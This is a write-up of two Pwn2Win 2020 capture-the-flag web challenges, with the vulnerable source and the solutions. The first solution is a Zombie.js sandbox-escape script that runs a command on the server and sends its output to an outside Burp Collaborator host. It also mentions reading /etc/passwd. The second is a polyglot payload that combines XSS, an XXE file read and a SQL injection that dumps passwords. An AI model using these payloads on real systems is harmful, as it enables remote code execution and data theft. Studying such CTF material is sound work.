# Pwn2Win 2020 CTF Writeup
 

## 1. Dr Manhattan 
Vulnerable Code :
```<?php
if ( isset($_GET['source']) ) {
    show_source('index.php');
}
if ( strpos($_POST['url'],'http://') === 0 || strpos($_POST['url'],'https://') === 0 ) {
    echo system('timeout 8s wappalyzer ' . escapeshellarg(escapeshellcmd($_POST['url'])));
    // npm install wappalyzer@5.9.34
}
?>
```
Solution :
```
<script> 

const a=this.constructor.constructor.constructor("return this.process.mainModule.require('child_process').execSync('/get_flag').toString()")()

var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
                      if (this.readyState == 4 && this.status == 200) {
                      console.log(xhttp.responseText)
       			};
             xhttp.open("GET", "http://rxsfpjqhpd6p2b35q3cjqt8e95f83x.burpcollaborator.net?"+btoa(a), true);
                xhttp.send();
</script>
```
Flag :
`CTF-BR{0ur_0day_w4s_f1x3d_l1t3r4lly_y3st3rd4y_l1k3_wtf????}
`

Detail :
```
wappalyzer@5.9.34 uses Zombie.js as default browser to render pages, interesting thing about Zombie.js is it executes javascript code of pages in the context of node application.

There's interesting dicussion about this here : https://github.com/nodejs/security-wg/pull/442

So we can get RCE by executing javascript (in HTML page) as :

	this.constructor.constructor.constructor("return this.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()")()

```

## 2. A Payload to rule them all 

Vulnerable Code :
```
/usr/src/app/index.js : 
const express = require("express") const app = express() const bodyParser = require("body-parser") const port = 31337 const { execFile } = require("child_process") const fs = require("fs") const rateLimit = require("express-rate-limit"); app.use(express.static("static")) app.use(bodyParser.urlencoded({extended:true})) const limiter = rateLimit({ windowMs: 10 * 60 * 1000, // 15 minutes max: 50 // limit each IP to 100 requests per windowMs }); app.use('/',limiter); app.post('/', (req,res) => { const test_payload = execFile("/usr/sbin/gosu",["gnx","/home/gnx/script/test_payload.js",req.body.payload], ( error, stdout, stderr ) => { if ( stdout.toString().trim() === "parabens hackudo" ) { res.send(process.env.FLAG) } else { res.send("nope") } }); console.log(req.body.payload) }) app.get('/source', (req,res) => { var out = "/usr/src/app/index.js :\n\n" + fs.readFileSync("/usr/src/app/index.js").toString() + "\n\n" out += "/home/gnx/script/test_payload.js :\n\n" + fs.readFileSync("/home/gnx/script/test_payload.js") + "\n\n" res.send(out) }) app.listen(port,'0.0.0.0', () => console.log(`Chall rodando em http://localhost:${port}`)) 

/home/gnx/script/test_payload.js : 
#!/usr/bin/env node const puppeteer = require('puppeteer') const mysql = require("mysql") const util = require('util') const libxml = require("libxmljs") const fs = require("fs") const sanitizeHtml = require("sanitize-html") function test_xxe(payload) { try { var my_secret = Math.random().toString(36).substring(2) ; fs.writeFileSync("/home/gnx/script/xxe_secret",my_secret) var doc = libxml.parseXml(payload, { noent: true ,nonet: true }) return doc.toString().includes(my_secret) } catch (e) { return false } } async function test_xss(payload) { try { const browser = await puppeteer.launch({args:['--no-sandbox', '--disable-setuid-sandbox','--disable-dev-shm-usage','--disable-accelerated-2d-canvas','--no-first-run','--no-zygote','--single-process','--disable-gpu']}) const page = await browser.newPage() page.setDefaultNavigationTimeout(1000); payload = sanitizeHtml(payload,{allowedTags:[]}) await page.goto(`data:text/html,`) const check = await page.evaluate("( typeof xss != 'undefined' ? true : false )") // vlw herrera await browser.close() return check } catch (error) { console.error(error) } } async function test_sqli(payload) { var connection = mysql.createConnection({ host : process.env.MYSQL_HOST || "127.0.0.1", user : process.env.MYSQL_USER, password : process.env.MYSQL_PASSWORD, database : process.env.MYSQL_DATABASE, charset: 'utf8', dialectOptions: { collate: 'utf8_general_ci', }, }) const query = util.promisify(connection.query).bind(connection) connection.connect() const users = await query("SELECT * from users") try { const sqli = await query(`SELECT * from posts where id='${payload}'`) await connection.end() return JSON.stringify(sqli).includes(users[0]["password"]) } catch(e) { return false } } function main(args){ var xss = test_xss(args[0]) var sqli = test_sqli(args[0]) var xxe = test_xxe(args[0]) Promise.all([xss,sqli]).then( function( values ){ if ( values[0] && values[1] && xxe ) { console.log("parabens hackudo") } else { console.log("hack harder") } process.exit(0) }) } main(process.argv.slice(2))
```

Solution :
```
payload=<?xa <a>xss=1//</a> ?><!DOCTYPE xx [ <!ENTITY bar SYSTEM "file:///home/gnx/script/xxe_secret"> ]> <x><a>%26bar;</a>' and 1=0  union  select password,password,password from users where 1;-- -</x>
```

Flag : `CTF-BR{p4yl04d_p0lygl0ts_4r3_m0r3_fun_th4n_f1l3typ3s}`

Detail :
```
In this challenge we have to create a polyglot payload that would work for XSS, XXE and SQLi injections.

XSS : In this case payload was being sanitized using sanitize-html, so after sanitization our payload would become a valid JS as below :

	xss=1// ?&gt; ]&gt; %26bar;' and 1=0  union  select password,password,password from users where 1;-- -

XXE : In this case payload needs to be a valid XML, interestingly XML parser allows anything in between <?xa <a>xss=1//</a> ?> , we abused this to make XSS payload valid (after sanitization), and same with SQLi payload , we added SQLi payload inside <x> element.

SQLi : It was the easiest one and self-explanatory.

```